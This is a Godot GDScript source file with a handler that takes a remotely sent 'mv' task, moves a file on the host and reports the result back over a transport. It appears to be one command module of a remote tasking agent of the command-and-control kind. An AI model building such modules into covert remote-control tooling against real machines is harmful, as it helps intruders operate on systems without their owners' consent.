extends Node

func _on_tasking_mv(transport, task):

	if task.has("command") and task.get("command") == "mv":
		var test_json_conv = JSON.new()
		test_json_conv.parse(task.get("parameters"))
		var parameters = test_json_conv.get_data()
		var source = parameters.get("source").simplify_path()
		var destination = parameters.get("destination").simplify_path()
		var ret = DirAccess.rename_absolute(source, destination)

		var output = "Moved %s to %s" % [source, destination]

		if ret != OK:
			output = "Failed to move %s to %s" % [source, destination]

		transport.send(
			transport.create_task_response(
				ret == OK,
				true,
				task.get("id"),
				output
			)
		)
	else:
		pass
		# TODO: error state
